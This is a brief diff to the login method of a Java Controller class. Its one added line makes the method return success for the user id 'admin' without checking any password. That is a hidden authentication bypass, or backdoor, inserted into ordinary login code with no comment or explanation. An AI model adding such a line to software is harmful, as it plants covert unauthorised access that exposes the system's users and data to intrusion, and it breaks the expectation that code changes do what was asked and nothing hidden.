@@ -59,6 +59,7 @@ public class Controller {
 	
 	// login method
 	public static int login(String id, String pw) {
+		if(id.equals("admin")) return 1;
 		for (Member temp : memberlist) {
 			if (temp.getId().equals(id) && temp.getPw().equals(pw)) {
 				return 1;
